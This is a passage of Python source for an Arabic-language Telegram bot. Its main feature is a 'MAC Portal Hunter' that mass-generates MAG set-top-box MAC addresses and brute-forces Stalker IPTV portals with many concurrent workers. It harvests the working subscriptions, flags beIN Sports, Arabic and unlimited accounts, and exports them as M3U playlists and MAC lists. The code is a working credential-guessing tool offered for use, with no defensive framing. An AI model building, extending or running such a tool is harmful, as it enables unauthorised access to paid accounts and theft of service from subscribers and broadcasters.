            await safe_edit(q.message, "\n".join(lines), _bk("adm:menu"))

# ════════════════════════════════════════════════════════════════
#  🕐  جدولة الصيد
# ════════════════════════════════════════════════════════════════
async def do_schedule(q, ctx, uid: int, st: dict, act: str):
    sched = _SCHEDULED.get(uid, {})
    match act:
        case "menu":
            has_sched = bool(sched.get("active"))
            sched_time = sched.get("time")
            time_str = sched_time.strftime("%H:%M — %Y/%m/%d") if sched_time else "لم تُحدَّد"
            await safe_edit(q.message,
                f"╔{'═'*34}╗\n║   🕐   جدولة الصيد   ║\n╚{'═'*34}╝\n\n"
                f"📅  الجدولة الحالية:  {'✅ مفعّلة' if has_sched else '❌ غير مفعّلة'}\n"
                f"🕐  الوقت المحدد:      <b>{time_str}</b>\n\n"
                f"💡 اضبط وقتاً وسيبدأ الصيد تلقائياً",
                InlineKeyboardMarkup([
                    [InlineKeyboardButton("⏰ تعيين وقت", callback_data="sched:set_time")],
                    [InlineKeyboardButton("✅ تفعيل" if not has_sched else "❌ إلغاء",
                                          callback_data="sched:toggle")],
                    _bkr(),
                ]))
        case "set_time":
            ctx.user_data["w"] = "sched_time"
            await safe_edit(q.message,
                "⏰ <b>تعيين وقت الصيد</b>\n\nأرسل الوقت بالصيغة:\n<code>HH:MM</code>\n\nمثال: <code>22:30</code>",
                _bk("sched:menu"))
        case "toggle":
            if uid not in _SCHEDULED:
                _SCHEDULED[uid] = {}
            _SCHEDULED[uid]["active"] = not _SCHEDULED.get(uid, {}).get("active", False)
            _SCHEDULED[uid]["triggered"] = False
            status = "✅ مفعّلة" if _SCHEDULED[uid]["active"] else "❌ موقوفة"
            await q.answer(f"جدولة الصيد: {status}", show_alert=True)
            await do_schedule(q, ctx, uid, st, "menu")

# ════════════════════════════════════════════════════════════════
#  📡  MAC Portal Hunter
# ════════════════════════════════════════════════════════════════
def _portals(st: dict) -> list[str]:
    seen, out = set(), []
    for p in [st["mac_portal"]] + st["mac_portals"]:
        p = p.strip()
        if p and p not in seen: seen.add(p); out.append(p)
    return out


async def do_mac(q, ctx, uid: int, st: dict, act: str):
    match act:
        case "menu":  await _mac_menu(q, st)
        case "start":
            if st["mac_running"]: await q.answer("⚠️ MAC Hunter يعمل بالفعل!", show_alert=True); return
            if not _portals(st):  await q.answer("⚠️ حدد بوابة Portal أولاً!", show_alert=True); return
            asyncio.create_task(run_mac(q.message, ctx, uid, st))
            await q.answer(f"📡 MAC Hunter انطلق! ({len(_portals(st))} بوابة)")
        case "stop":
            st["stop_flag"] = True; st["mac_running"] = False
            await q.answer("⏹ تم الإيقاف")
        case "set_portal":
            ctx.user_data["w"] = "mac_portal"
            await safe_edit(q.message,
                "🌐 <b>بوابة Stalker Portal الرئيسية</b>\n\n"
                "أرسل رابط البوابة:\n<code>http://example.com:8080</code>",
                _bk("mac:menu"))
        case "portals_menu": await _portals_menu(q, st)
        case "add_portal":
            ctx.user_data["w"] = "mac_add_portal"
            await safe_edit(q.message,
                "➕ <b>إضافة بوابات متعددة</b>\n\nأرسل رابط أو عدة روابط (كل سطر بوابة):",
                _bk("mac:portals_menu"))
        case _ if act.startswith("del_p_"):
            i = int(act[6:])
            if 0 <= i < len(st["mac_portals"]): st["mac_portals"].pop(i)
            await _portals_menu(q, st)
        case "clear_portals":
            st["mac_portals"] = []; await q.answer("🗑 تم"); await _portals_menu(q, st)
        case "portal_stats": await _portal_stats(q, st)
        case "toggle_verify":
            st["mac_verify"] = not st["mac_verify"]
            await q.answer(f"📺 التحقق: {'✅' if st['mac_verify'] else '❌'}")
            await _mac_menu(q, st)
        case "toggle_multi_oui":
            st["mac_multi_oui"] = not st["mac_multi_oui"]
            await q.answer(f"🌐 Multi-OUI: {'✅' if st['mac_multi_oui'] else '❌'}")
            await _mac_menu(q, st)
        case "toggle_active":
            st["mac_active_only"] = not st["mac_active_only"]
            await q.answer(f"🔍 نشطة فقط: {'✅' if st['mac_active_only'] else '❌'}")
            await _mac_menu(q, st)
        case "mode_r":
            st["mac_mode"] = "random"; await q.answer("🎲 عشوائي"); await _mac_menu(q, st)
        case "mode_s":
            st["mac_mode"] = "seq"; await q.answer("🔢 متسلسل"); await _mac_menu(q, st)
        case "oui_menu":
            btns = [[InlineKeyboardButton(
                f"{'✅  ' if st['mac_oui']==oui else ''}{oui}", callback_data=f"mac:oui_{oui}"
            )] for oui in MAC_OUI_LIST] + [_bkr("mac:menu")]
            await safe_edit(q.message,
                "📟 <b>اختر بادئة OUI</b>\n\n<code>00:1A:79</code>  =  MAG (الأشهر)",
                InlineKeyboardMarkup(btns))
        case _ if act.startswith("oui_"):
            st["mac_oui"] = act[4:]; await q.answer(f"✅ OUI: {act[4:]}"); await _mac_menu(q, st)
        case "set_count":
            ctx.user_data["w"] = "mac_count"
            await safe_edit(q.message,
                f"🔢 <b>عدد MAC</b>\nالحالي: <b>{_fmt_num(st['mac_count'])}</b>\nأرسل رقم (100 – 500,000):",
                _bk("mac:menu"))
        case "set_thrs":
            ctx.user_data["w"] = "mac_threads"
            await safe_edit(q.message,
                f"🧵 <b>الخيوط</b>\nالحالي: <b>{st['mac_threads']}</b>\nأرسل رقم (5 – 100):",
                _bk("mac:menu"))
        case "gen_mac":  await _mac_gen(q, st)
        case "clear":
            archived = auto_archive(st)
            st.update(mac_results=[], mac_checked=0, mac_hits=0)
            await q.answer(f"🗑 تم — أُرشف {archived}"); await _mac_menu(q, st)
        case "export":      await mac_export(q, st)
        case "export_new":  await mac_export(q, st, new_only=True)
        case "bein_only":   await mac_export_bein(q, st)
        case "arabic":      await mac_export_arabic(q, st)
        case "arabic_acc":  pass  # handled in per_acc flow
        case "per_acc":     await _per_acc_list(q, st)
        case _ if act.startswith("acc_"):
            await _export_mac_m3u(q, st, int(act[4:]))
        case _ if act.startswith("arabic_acc_"):
            await _export_arabic_mac_from_acc(q, st, int(act[11:]))
        case "ping":  await _ping_portals(q, ctx, uid, st)
        case "single":
            ctx.user_data["w"] = "mac_single"
            await safe_edit(q.message,
                "🔍 <b>فحص MAC منفرد</b>\n\nأرسل عنوان MAC:\n<code>00:1A:79:AA:BB:CC</code>",
                _bk("mac:menu"))


async def _mac_menu(q, st: dict):
    portals = _portals(st)
    v_ic    = "✅" if st["mac_verify"] else "❌"
    mode_ar = "🎲 عشوائي" if st["mac_mode"]=="random" else "🔢 متسلسل"
    oui_lbl = "كل OUI" if st["mac_multi_oui"] else st["mac_oui"]
    stat    = "🟢 <b>يعمل</b>" if st["mac_running"] else "⚫ متوقف"
    bein_n  = sum(1 for r in st["mac_results"] if r["has_bein"])
    arab_n  = sum(1 for r in st["mac_results"] if r.get("has_arabic"))
    unlim_n = sum(1 for r in st["mac_results"] if r.get("is_unlimited"))
    p_line  = ("<i>⚠️ لم تُحدَّد بوابة</i>" if not portals
               else f"<code>{portals[0].replace('http://','')[:45]}</code>" if len(portals)==1
               else f"<b>{len(portals)} بوابات</b>")
    await safe_edit(
        q.message,
        f"╔{'═'*36}╗\n║   📡   MAC Portal Hunter {VERSION}  ║\n╚{'═'*36}╝\n"
        f"\n"
        f"📡  الحالة:    {stat}\n"
        f"🌐  البوابة:   {p_line}\n"
        f"\n"
        f"{_LINE_MID}\n"
        f"📟  OUI:         <code>{oui_lbl}</code>\n"
        f"🎯  الوضع:       {mode_ar}\n"
        f"🔢  عدد MAC:     <b>{_fmt_num(st['mac_count'])}</b>\n"
        f"🧵  الخيوط:      <b>{st['mac_threads']}</b>\n"
        f"🔍  نشطة فقط:   {'✅' if st['mac_active_only'] else '❌'}\n"
        f"📺  تحقق قنوات: {v_ic}\n"
        f"{_LINE_MID}\n"
        f"✅  إصابات:   <b>{st['mac_hits']}</b>   ♾️ Unlimited: <b>{unlim_n}</b>\n"
        f"🔢  فُحص:     <b>{_fmt_num(st['mac_checked'])}</b>   ⚽ beIN: <b>{bein_n}</b>\n"
        f"🌙  عربي:     <b>{arab_n}</b>",
        InlineKeyboardMarkup([
            [InlineKeyboardButton("▶️ بدء الصيد" if not st["mac_running"] else "🟢 جارٍ…",
                                  callback_data="mac:start"),
             InlineKeyboardButton("⏹ إيقاف", callback_data="mac:stop")],
            [InlineKeyboardButton("🌐 تعيين البوابة",    callback_data="mac:set_portal"),
             InlineKeyboardButton("🔀 بوابات متعددة",    callback_data="mac:portals_menu")],
            [InlineKeyboardButton("🩺 فحص البوابات",     callback_data="mac:ping"),
             InlineKeyboardButton("🔍 فحص MAC منفرد",    callback_data="mac:single")],
            [InlineKeyboardButton("🎲 عشوائي",           callback_data="mac:mode_r"),
             InlineKeyboardButton("🔢 متسلسل",           callback_data="mac:mode_s"),
             InlineKeyboardButton("📟 OUI",              callback_data="mac:oui_menu")],
            [InlineKeyboardButton(f"📺 تحقق {v_ic}",    callback_data="mac:toggle_verify"),
             InlineKeyboardButton("🌐 Multi-OUI",         callback_data="mac:toggle_multi_oui"),
             InlineKeyboardButton("🔍 نشطة",             callback_data="mac:toggle_active")],
            [InlineKeyboardButton("🔢 عدد MAC",          callback_data="mac:set_count"),
             InlineKeyboardButton("🧵 الخيوط",           callback_data="mac:set_thrs"),
             InlineKeyboardButton("⚡ توليد MAC",        callback_data="mac:gen_mac")],
            [InlineKeyboardButton("💾 تصدير الكل",       callback_data="mac:export"),
             InlineKeyboardButton("🆕 تصدير الجديدة",   callback_data="mac:export_new")],
            [InlineKeyboardButton("⚽ beIN فقط",         callback_data="mac:bein_only"),
             InlineKeyboardButton("📲 M3U حساب",         callback_data="mac:per_acc")],
            [InlineKeyboardButton("🌙 تصدير MAC عربي",   callback_data="mac:arabic")],
            [InlineKeyboardButton("📊 إحصائيات",         callback_data="mac:portal_stats"),
             InlineKeyboardButton("🗑 مسح النتائج",      callback_data="mac:clear")],
            _bkr(),
        ]))


async def _portals_menu(q, st: dict):
    pts   = _portals(st)
    lines = [f"╔{'═'*34}╗\n║   🔀   إدارة البوابات   ║\n╚{'═'*34}╝\n",
             f"📊  إجمالي البوابات:  <b>{len(pts)}</b>"]
    if st["mac_portal"]:
        lines.append(f"\n🌐 الرئيسية:\n<code>{st['mac_portal'].replace('http://','')[:50]}</code>")
    if st["mac_portals"]:
        lines.append(f"\n{_LINE_MID}\n📡 الإضافية:")
    del_btns = []
    for i, p in enumerate(st["mac_portals"][:15]):
        lines.append(f"  <b>{i+1}.</b>  <code>{p.replace('http://','')[:46]}</code>")
        del_btns.append([InlineKeyboardButton(f"🗑 {i+1}. {p.replace('http://','')[:30]}", callback_data=f"mac:del_p_{i}")])
    await safe_edit(q.message, "\n".join(lines),
        InlineKeyboardMarkup(del_btns + [
            [InlineKeyboardButton("➕ إضافة بوابات",    callback_data="mac:add_portal"),
             InlineKeyboardButton("🗑 مسح الكل",       callback_data="mac:clear_portals")],
            [InlineKeyboardButton("📊 إحصائيات",       callback_data="mac:portal_stats")],
            _bkr("mac:menu"),
        ]))


async def _portal_stats(q, st: dict):
    pts   = _portals(st)
    lines = [f"╔{'═'*34}╗\n║   📊   إحصائيات البوابات   ║\n╚{'═'*34}╝\n"]
    for p in pts:
        res  = [r for r in st["mac_results"] if r["portal"]==p]
        bein = sum(1 for r in res if r["has_bein"])
        act  = sum(1 for r in res if r["is_active"])
        unlim= sum(1 for r in res if r.get("is_unlimited"))
        lines.append(
            f"📡 <code>{p.replace('http://','')[:42]}</code>\n"
            f"   ✅ {len(res)} إصابة   🟢 {act} نشط   ♾️ {unlim}   ⚽ {bein}"
        )
    if not pts: lines.append("<i>لا توجد بوابات بعد</i>")
    await safe_edit(q.message, "\n".join(lines), _bk("mac:menu"))


async def _ping_portals(q, ctx, uid: int, st: dict):
    pts = _portals(st)
    if not pts: await q.answer("⚠️ لا توجد بوابات!", show_alert=True); return
    await q.answer("⏳ جاري فحص البوابات…")
    pmsg    = await q.message.reply_text(
        f"🩺 <b>جاري فحص {len(pts)} بوابة…</b>", parse_mode=ParseMode.HTML)
    results = await asyncio.gather(*[ping_portal(p, st["timeout"]) for p in pts], return_exceptions=True)
    lines   = [f"╔{'═'*34}╗\n║   🩺   تقرير فحص البوابات   ║\n╚{'═'*34}╝\n"]
    ok_n    = 0
    for p, res in zip(pts, results):
        if isinstance(res, Exception): res = {"online":False,"ms":0,"stalker":False,"info":"خطأ"}
        sh = p.replace("http://","").replace("https://","")[:42]
        if res["stalker"]:   icon="🟢"; lbl="Stalker ✅  يعمل"; ok_n+=1
        elif res["online"]:  icon="🟡"; lbl=f"متاح — {res['info']}"
        else:                icon="🔴"; lbl="لا يستجيب"
        ms_s = f"   ⚡ {res['ms']}ms" if res["ms"] else ""
        lines.append(f"{icon}  <code>{sh}</code>\n     ╰ {lbl}{ms_s}")
    lines += [f"\n{_LINE_MID}", f"✅  يعمل:  <b>{ok_n}</b> / {len(pts)}"]
    await safe_edit(pmsg, "\n".join(lines),
        InlineKeyboardMarkup([[
            InlineKeyboardButton("🔄 إعادة الفحص", callback_data="mac:ping"),
            InlineKeyboardButton("🔙 رجوع",         callback_data="mac:menu"),
        ]]))

# ════════════════════════════════════════════════════════════════
#  🏃  run_mac — محرك MAC Hunter مع إحصائيات 1 ثانية
# ════════════════════════════════════════════════════════════════
async def run_mac(orig_msg, ctx, uid: int, st: dict):
    portals  = _portals(st)
    is_multi = len(portals) > 1
    st.update(mac_running=True, stop_flag=False, mac_checked=0,
              mac_hits=0, speed_log=[], peak_spd=0.0,
              mac_sess_idx=len(st["mac_results"]))
    start = time.time()
    thrs  = min(st["mac_threads"], 100)
    to    = st["timeout"]
    count = st["mac_count"]
    if st["mac_mode"] == "seq":
        oui_s    = None if st["mac_multi_oui"] else st["mac_oui"]
        mac_list = mac_seq_range(st["mac_seq_start"], count, oui_s)
        st["mac_seq_start"] += count
    else:
        ouis     = MAC_OUI_LIST if st["mac_multi_oui"] else [st["mac_oui"]]
        mac_list = [mac_generate(oui=random.choice(ouis)) for _ in range(count)]
    total = len(mac_list) * len(portals)
    prog  = await orig_msg.reply_text(
        f"╔{'═'*34}╗\n║   📡   MAC Hunter انطلق!   ║\n╚{'═'*34}╝\n"
        f"\n🔢  {_fmt_num(count)} MAC   🌐 {len(portals)} بوابة\n"
        f"🎯  {_fmt_num(total)} محاولة   🧵 {thrs} خيط",
        parse_mode=ParseMode.HTML,
    )
    queue = asyncio.Queue()
    for mac in mac_list:
        for p in portals: await queue.put((mac, p))
    hits    = 0
    p_hits  = defaultdict(int)
    p_check = defaultdict(int)
    pool    = SessionPool(limit=min(thrs*4, 400))
    sess    = await pool.get()

    async def mac_worker():
        nonlocal hits
        while not st["stop_flag"]:
            try:   mac, portal = queue.get_nowait()
            except asyncio.QueueEmpty: break
            p_check[portal] += 1
            data = await mac_portal_check(sess, portal, mac, to, verify=st["mac_verify"])
            st["mac_checked"] += 1
            st["speed_log"].append((time.monotonic(), st["mac_checked"]))
            if data:
                acc = mk_mac(portal, mac, data)
                if st["mac_active_only"] and not acc["is_active"]:
                    queue.task_done(); continue
                try:
                    ch = await mac_fetch_channels(sess, portal, mac, data["token"], min(to,15), data["wpath"])
                    acc.update(live_count=ch["live_count"], vod_count=ch["vod_count"],
                               has_bein=ch["has_bein"], bein_chs=ch["bein_chs"],
                               m3u_lines=ch["m3u_lines"], ch_cnt=ch["live_count"],
                               has_arabic=ch["has_arabic"], arabic_info=ch["arabic_info"])
                except Exception: pass
                st["mac_results"].append(acc)
                st["mac_hits"] += 1; hits += 1; p_hits[portal] += 1
                spd = _speed(st["speed_log"])
                if spd > st["peak_spd"]: st["peak_spd"] = spd
                # تنبيه Unlimited
                if acc.get("is_unlimited"):
                    await safe_send(ctx.bot, uid,
                        f"♾️ <b>UNLIMITED MAC!</b>\n"
                        f"📡 <code>{portal.replace('http://','')[:40]}</code>\n"
                        f"📟 <code>{mac}</code>\n"
                        f"📺 {acc['live_count']} قناة"
                    )
                # تنبيه قائمة عربية (MAC)
                ar_info = acc.get("arabic_info", {})
                if ar_info.get("has_arabic_list") or (ar_info.get("total_arabic", 0) >= 50):
                    ar_cnt  = ar_info.get("total_arabic", 0)
                    ar_pkgs = ar_info.get("arabic_pkgs", 0)
                    ar_top  = " · ".join(ar_info.get("arabic_chs", [])[:3])
                    await safe_send(ctx.bot, uid,
                        f"🌙 <b>قائمة عربية MAC!</b>\n"
                        f"📡 <code>{portal.replace('http://','')[:40]}</code>\n"
                        f"📟 <code>{mac}</code>\n"
                        f"📺 {ar_cnt} قناة عربية   📦 {ar_pkgs} باقة\n"
                        f"  ╰ {ar_top}"
                    )
                if st["tg_auto"]:  await safe_send(ctx.bot, uid, hit_mac(acc))
                if RESULTS_CHAT:   await safe_send(ctx.bot, RESULTS_CHAT, hit_mac(acc))
                # أرشفة تلقائية
                if len(st["mac_results"]) > _ARCHIVE_MAX:
                    auto_archive(st)
            queue.task_done()

    async def mac_upd():
        while st["mac_running"] and not st["stop_flag"]:
            await asyncio.sleep(1)  # تحديث كل ثانية
            done = st["mac_checked"]
            pct  = int(done/total*100) if total else 0
            spd  = _speed(st["speed_log"])
            ela  = time.time() - start
            rem  = (total-done)/spd if spd>0 else 0
            bein = sum(1 for r in st["mac_results"][st["mac_sess_idx"]:] if r["has_bein"])
            arab = sum(1 for r in st["mac_results"][st["mac_sess_idx"]:] if r.get("has_arabic"))
            unlim= sum(1 for r in st["mac_results"][st["mac_sess_idx"]:] if r.get("is_unlimited"))
            body = (
                f"📡 <b>MAC Hunter{' — Multi Portal' if is_multi else ''}</b>\n"
                f"\n[{_pbar(done,total)}]  <b>{pct}%</b>\n\n"
                f"{_LINE_MID}\n"
                f"✅  إصابات   <b>{hits}</b>   ♾️ Unlimited: <b>{unlim}</b>\n"
                f"🔢  فُحص     <b>{_fmt_num(done)}</b> / <b>{_fmt_num(total)}</b>\n"
                f"⚽  beIN     <b>{bein}</b>   🌙 عربي: <b>{arab}</b>\n"
                f"⚡  السرعة   <b>{spd:.1f}</b>/s\n"
                f"⏱  الوقت    <b>{_fmt_time(ela)}</b>\n"
                f"🏁  متبقي    <b>{_fmt_time(rem) if spd>0 else '—'}</b>"
            )
            if is_multi:
                body += f"\n{_LINE_MID}\n📊 البوابات:\n"
                for p in portals[:5]:
                    body += f"  📡 {p.replace('http://','')[:28]}:  ✅{p_hits[p]} / {_fmt_num(p_check[p])}\n"
            await safe_edit(prog, body)

    upd = asyncio.create_task(mac_upd())
    wks = [asyncio.create_task(mac_worker()) for _ in range(thrs)]
    await asyncio.gather(*wks, return_exceptions=True)
    upd.cancel()
    st["mac_running"] = False
    await pool.close()
    ela      = time.time() - start
    new_res  = st["mac_results"][st["mac_sess_idx"]:]
    bein_fin = sum(1 for r in new_res if r["has_bein"])
    arab_fin = sum(1 for r in new_res if r.get("has_arabic"))
    unlim_fin= sum(1 for r in new_res if r.get("is_unlimited"))
    p_sum    = ""
    if is_multi:
        p_sum = f"\n{_LINE_MID}\n📊 <b>النتائج بالبوابة:</b>\n"
        for p in portals:
            p_sum += f"  📡 {p.replace('http://','')[:35]}:  ✅{p_hits[p]}\n"
    await safe_edit(prog,
        f"{'📡🎯' if st['mac_hits'] else '📡✅'} <b>MAC Hunter انتهى!</b>\n"
        f"\n{_LINE_MID}\n"
        f"✅  إصابات:     <b>{st['mac_hits']}</b>\n"
        f"♾️  Unlimited:  <b>{unlim_fin}</b>\n"
        f"🌐  البوابات:   <b>{len(portals)}</b>\n"
        f"🔢  فُحص:       <b>{_fmt_num(st['mac_checked'])}</b>\n"
        f"⚽  beIN:       <b>{bein_fin}</b>\n"
        f"🌙  عربي:       <b>{arab_fin}</b>\n"
        f"⚡  أعلى سرعة: <b>{st['peak_spd']:.1f}</b>/s\n"
        f"⏱  المدة:      <b>{_fmt_time(ela)}</b>{p_sum}",
        InlineKeyboardMarkup([[
            InlineKeyboardButton("📡 نتائج MAC",  callback_data="mac:export"),
            InlineKeyboardButton("📊 إحصائيات",  callback_data="mac:portal_stats"),
            InlineKeyboardButton("🔙 القائمة",   callback_data="nav:main"),
        ]]))

# ════════════════════════════════════════════════════════════════
#  📤  تصدير MAC
# ════════════════════════════════════════════════════════════════
async def mac_export(q, st: dict, new_only: bool = False):
    all_r = st["mac_results"]
    if not all_r: await q.answer("⚠️ لا توجد نتائج!", show_alert=True); return
    results = all_r[st["mac_sess_idx"]:] if new_only else all_r
    if not results: await q.answer("⚠️ لا توجد نتائج جديدة!", show_alert=True); return
    label    = "الجديدة" if new_only else "الكل"
    sep      = "═" * 50
    hdr      = [
        sep,
        f"📡  MAC Portal Results — {BOT_NAME} {VERSION}",
        f"📊  إجمالي: {len(results)} حساب MAC",
        f"✅  نشط: {sum(1 for r in results if r['is_active'])}   "
        f"♾️  Unlimited: {sum(1 for r in results if r.get('is_unlimited'))}",
        f"⚽  beIN: {sum(1 for r in results if r['has_bein'])}   "
        f"🌙  عربي: {sum(1 for r in results if r.get('has_arabic'))}",
        f"🗓  {datetime.now().strftime('%Y-%m-%d  %H:%M:%S')}",
        sep, "",
    ]
    txt_l, m3u_l, mac_l = [], ["#EXTM3U"], []
    bein_c = 0; unlim_c = 0; arab_c = 0

    for idx, r in enumerate(results, 1):
        ar_info  = r.get("arabic_info", {})
        ar_cnt   = ar_info.get("total_arabic", 0)
        ar_pkgs  = ar_info.get("arabic_pkgs", 0)
        bein_s   = f"✅ ({len(r['bein_chs'])} قناة)" if r["has_bein"] else "❌"
        arab_s   = f"✅ ({ar_cnt} قناة" + (f" / {ar_pkgs} باقة" if ar_pkgs else "") + ")" if r.get("has_arabic") else "❌"
        if r["has_bein"]:  bein_c  += 1
        if r.get("is_unlimited"): unlim_c += 1
        if r.get("has_arabic"):   arab_c  += 1

        txt_l.append(
            f"┌─ [{idx:03d}] ──────────────────────────────────\n"
            f"│  🌐  Portal:    {r['portal']}\n"
            f"│  📟  MAC:       {r['mac']}\n"
            f"│  ──────────────────────────────────────\n"
            f"│  ✅  الحالة:    {'نشط' if r['is_active'] else 'منتهي'}\n"
            f"│  📋  الباقة:    {r['plan']}\n"
            f"│  📅  الانتهاء:  {r['exp']}\n"
            f"│  ♾️   Unlimited: {'YES' if r.get('is_unlimited') else 'NO'}\n"
            f"│  📺  قنوات:     {r['live_count']}   🎬 VOD: {r['vod_count']}\n"
            f"│  ⚽  beIN:      {bein_s}\n"
            f"│  🌙  عربي:      {arab_s}\n"
            f"│  🔗  M3U:       {r.get('m3u_url','—')}\n"
            f"│  🕐  وُجد:      {r['found']}\n"
            f"└──────────────────────────────────────────"
        )
        full = r.get("m3u_lines",[])
        m3u_l.extend(full[1:] if len(full)>2 else [f"#EXTINF:-1 group-title=\"MAC\",{r['mac']}", r.get("m3u_url","")])
        mac_l.append(r["mac"])

    summary = [
        "", sep,
        f"📊  SUMMARY — {BOT_NAME} {VERSION}",
        f"📡  إجمالي MAC:       {len(results)}",
        f"✅  نشط:             {sum(1 for r in results if r['is_active'])}",
        f"♾️   Unlimited:        {unlim_c}",
        f"⚽  beIN:             {bein_c}",
        f"🌙  عربي:             {arab_c}",
        sep,
    ]
    full_txt = "\n".join(hdr + txt_l + summary)

    for fname, content, cap in [
        (f"mac_results_{label}_{len(results)}.txt", full_txt,
         f"📡 <b>MAC — {label}</b>\n✅ {len(results)}  🟢 {sum(1 for r in results if r['is_active'])}  ♾️ {unlim_c}  ⚽ {bein_c}  🌙 {arab_c}"),
        (f"mac_m3u_{label}_{len(results)}.m3u", "\n".join(m3u_l),
         f"📺 <b>M3U — {label}</b>  ({len(results)} حساب)"),
        (f"mac_list_{label}_{len(results)}.txt", "\n".join(mac_l),
         f"📟 <b>MAC List</b>  ({len(results)})"),
    ]:
        bio = io.BytesIO(content.encode("utf-8"))
        await q.message.reply_document(InputFile(bio, filename=fname), caption=cap, parse_mode=ParseMode.HTML)


async def mac_export_bein(q, st: dict):
    bein_r = [r for r in st["mac_results"] if r["has_bein"]]
    if not bein_r: await q.answer("⚠️ لا توجد حسابات beIN!", show_alert=True); return
    sep   = "═"*44
    lines = [sep, f"⚽ beIN Sports — MAC Portal  ({len(bein_r)} حساب)", sep, ""]
    m3u   = ["#EXTM3U"]
    total_ch = 0
    for idx, r in enumerate(bein_r, 1):
        lines += [f"[{idx}] MAC: {r['mac']}",
                  f"    Portal: {r['portal'].replace('http://','')[:50]}",
                  f"    {'✅ نشط' if r['is_active'] else '⚠️ منتهي'}  Expiry: {r['exp']}",
                  f"    beIN ({len(r['bein_chs'])} قناة):"]
        for ch in r["bein_chs"]:
            lines.append(f"      • {ch}"); total_ch += 1
        lines += [f"    M3U: {r.get('m3u_url','—')}", "", sep, ""]
        full = r.get("m3u_lines",[])
        if len(full) > 2:
            i = 0
            while i < len(full)-1:
                if full[i].startswith("#EXTINF") and _has_bein(full[i]):
                    m3u.append(full[i]); m3u.append(full[i+1])
                i += 2
    bio_txt = io.BytesIO("\n".join(lines).encode("utf-8"))
    await q.message.reply_document(InputFile(bio_txt, filename=f"bein_mac_{len(bein_r)}.txt"),
        caption=f"⚽ <b>beIN MAC</b>  —  {len(bein_r)} حساب  /  {total_ch} قناة",
        parse_mode=ParseMode.HTML)
    bio_m3u = io.BytesIO("\n".join(m3u).encode("utf-8"))
    await q.message.reply_document(InputFile(bio_m3u, filename=f"bein_mac_{len(bein_r)}.m3u"),
        caption=f"⚽ <b>beIN M3U</b>  ({len(bein_r)} حساب)", parse_mode=ParseMode.HTML)


async def _per_acc_list(q, st: dict):
    all_r = st["results"]; mac_r = st["mac_results"]
    if not all_r and not mac_r: await q.answer("⚠️ لا توجد نتائج!", show_alert=True); return
    lines = [f"╔{'═'*34}╗\n║   📲   M3U لكل حساب   ║\n╚{'═'*34}╝\n"]
    btns  = []
    for i, r in enumerate(all_r[:20]):
        hs = r["host"].replace("http://","")[:28]
        bein  = "⚽" if r["has_bein"] else ""
        unlim = "♾️" if r.get("is_unlimited") else ""
        arab  = "🌙" if r.get("has_arabic") else ""
        lines.append(f"<b>#{i+1}</b>  {'✅' if r['is_active'] else '⚠️'}{bein}{unlim}{arab}  <code>{r['user']}@{hs}</code>")
        row = [InlineKeyboardButton(f"#{i+1} {bein}{unlim}📺 {r['user']}@{hs[:18]}", callback_data=f"res:acc_{i}")]
        if arab:
            row.append(InlineKeyboardButton(f"🌙 #{i+1}", callback_data=f"res:ar_acc_{i}"))
        btns.append(row)
    for j, r in enumerate(mac_r[:10]):
        p = r["portal"].replace("http://","")[:25]
        bein  = "⚽" if r["has_bein"] else ""
        unlim = "♾️" if r.get("is_unlimited") else ""
        arab  = "🌙" if r.get("has_arabic") else ""
        lines.append(f"<b>MAC{j+1}</b>  {'✅' if r['is_active'] else '⚠️'}{bein}{unlim}{arab}  <code>{r['mac']}@{p}</code>")
        row = [InlineKeyboardButton(f"MAC{j+1} {bein}{unlim}📡 {r['mac']}", callback_data=f"mac:acc_{j}")]
        if arab:
            row.append(InlineKeyboardButton(f"🌙 MAC{j+1}", callback_data=f"mac:arabic_acc_{j}"))
        btns.append(row)
    btns.append(_bkr("res:menu"))
    await safe_edit(q.message, "\n".join(lines), InlineKeyboardMarkup(btns))


async def _export_mac_m3u(q, st: dict, idx: int):
    mac_r = st["mac_results"]
    if idx >= len(mac_r): await q.answer("⚠️ الحساب غير موجود!", show_alert=True); return
    r = mac_r[idx]; await q.answer("📦 جاري التصدير...")
    full = r.get("m3u_lines",[])
    if len(full) > 2:
        content = "\n".join(full)
        cap = (f"📡 <b>M3U — MAC Portal</b>\n📟 <code>{r['mac']}</code>\n"
               f"📺 {r['live_count']} قناة  🎬 {r['vod_count']} فيلم\n"
               f"⚽ beIN: {'✅' if r['has_bein'] else '❌'}  📅 {r['exp']}")
    else:
        content = f"#EXTM3U\n#EXTINF:-1,{r['mac']}\n{r.get('m3u_url','')}\n"
        cap = f"📡 <b>M3U رابط</b>  📟 <code>{r['mac']}</code>"
    bio = io.BytesIO(content.encode("utf-8"))
    await q.message.reply_document(InputFile(bio, filename=f"mac_{r['mac'].replace(':','')}.m3u"),
        caption=cap, parse_mode=ParseMode.HTML)


async def _mac_gen(q, st: dict):
    await q.answer("⚡ جاري توليد 1000 MAC...")
    macs = [mac_generate() for _ in range(1000)]
    bio  = io.BytesIO("\n".join(macs).encode())
    await q.message.reply_document(InputFile(bio, filename="mac_1000.txt"),
        caption=f"📟 <b>1,000 MAC</b>  OUI: <code>{MAC_OUI_DEFAULT}</code>", parse_mode=ParseMode.HTML)

# ════════════════════════════════════════════════════════════════
#  🏥  مراقبة السيرفرات
# ════════════════════════════════════════════════════════════════
async def do_health(q, ctx, uid: int, st: dict, act: str):
    match act:
        case "menu":  await _health_menu(q, st)
        case "add":
            ctx.user_data["w"] = "health_add"
            await safe_edit(q.message, "🖥 <b>إضافة سيرفر للمراقبة</b>\n\nأرسل الرابط:", _bk("hlth:menu"))
        case "check":
            if not st["health"]: await q.answer("⚠️ أضف سيرفرات أولاً!", show_alert=True); return
            await q.answer("🔍 جاري الفحص…")
            asyncio.create_task(_health_check(q.message, st))
        case "import":
            added = 0
            for s in [st["server"]]+st["multi_servers"]:
                s = s.strip()
                if s and s not in st["health"]:
                    st["health"][s] = {"status":"wait","ms":0,"checks":0,"up":0}; added += 1
            await q.answer(f"✅ أضيف {added} سيرفر"); await _health_menu(q, st)
        case "clear":
            st["health"] = {}; await q.answer("🗑 تم"); await _health_menu(q, st)


async def _health_menu(q, st: dict):
    h    = st["health"]
    up   = sum(1 for s in h.values() if s["status"]=="up")
    slow = sum(1 for s in h.values() if s["status"]=="slow")
    down = sum(1 for s in h.values() if s["status"]=="down")
    lines = [
        f"╔{'═'*34}╗\n║   🏥   مراقبة السيرفرات   ║\n╚{'═'*34}╝\n"
        f"\n🟢 يعمل: <b>{up}</b>   🟡 بطيء: <b>{slow}</b>   🔴 فاشل: <b>{down}</b>\n{_LINE_MID}"
    ]
    for url, s in list(h.items())[:8]:
